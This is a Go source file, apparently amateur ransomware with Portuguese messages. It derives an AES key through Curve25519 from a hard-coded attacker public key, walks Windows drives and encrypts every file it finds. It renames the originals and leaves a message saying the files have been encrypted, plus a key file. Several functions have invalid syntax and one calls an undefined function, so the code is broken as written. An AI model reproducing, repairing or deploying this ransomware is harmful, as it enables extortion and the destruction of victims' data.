		package main

			import (
			  "fmt"
			  "os"
			  "path/filepath"
			  "golang.org/x/crypto/curve25519"
			  "crypto/rand"
			  "io"
			  "crypto/sha256"
			  "crypto/aes"
			  "crypto/cipher"
			)
			
		  var k [32]byte
		  var shared [32]byte
		  var pub [32]byte
		  var priv [32]byte
		  var pub2 =[32]byte{14, 54, 78 ,147, 219, 46, 173, 49, 165, 160, 248, 99, 188, 13, 95, 179, 5, 10, 26, 85, 28, 82, 38, 225, 157, 246, 167, 8 ,85, 204, 233 ,12}
			func GenerateKeyPair()([]byte){
			buffer := make([]byte, 32)
			  io.ReadFull(rand.Reader, buffer)
			  copy(priv[:], buffer)
			   curve25519.ScalarBaseMult(&pub, &priv)
			  curve25519.ScalarMult(&shared, &priv, &pub2)
			   k = sha256.Sum256([]byte(shared[:]))
			  fmt.Println("a chave e  ",pub)
			   fmt.Println("a chave privada  ",k)
			  
			  return k[:]




			}
			
		  func EncryptFile(filename string) {
			// Read the file into memory.
			plaintext, err := os.ReadFile(filename)
			if err != nil {
			  panic(err)
			}
			e := os.Rename(filename, filename+".Chuk")
		  if e != nil {
			fmt.Println(e)
			return
		  }
			

			// Create a new AES cipher block.
			block, err := aes.NewCipher(k[:])
			if err != nil {
			  panic(err)
			}

			// Create a new GCM cipher.
			aesgcm, err := cipher.NewGCM(block)
			if err != nil {
			  panic(err)
			}

			// Create a new nonce.
			nonce := make([]byte, aesgcm.NonceSize())
			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			  panic(err)
			}

			// Encrypt the data.
			ciphertext := aesgcm.Seal(nonce, nonce, plaintext, nil)

			// Write the encrypted data back to the file.
			if err := os.WriteFile(filename+".enc", ciphertext, 0644); err != nil {
			  panic(err)
			}
		  }

			
			func Chuk(chunk path,chunkInfo os.FileInfo, e error) error{
			EncryptFile(chunk)
			
			}
			
			func ScanDriverLetter(string letter)(error){
			e:=filepath.Walk(letter,Chuk)
			
			return e
			
			
			}
			


			

			func main() {
			GenerateKeyPair()
			//fmt.Println("a chave e  ",GenerateKeyPair())
			for j := 'A'; j <= 'Z'; j++ {
		// Crie o nome do arquivo
		driver:= string(j) + ":\\"
		// Verifique se o arquivo existe
		if _, er := os.Stat(driver); er == nil {
			fmt.Println("Unidade encontrada",driver)
			
		}
	}
			  EnumerateFolders("C:\\")
			  fmt.Println("seus arquivos foram criptografados  guarde sua chave publica",pub)
			  //os.Create("chave.txt")
			  file, err := os.Create("chave.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()


	n, err := file.WriteAt(pub[:], 0)
	fmt.Println(n)
	if err != nil {
		panic(err)
	}

			}
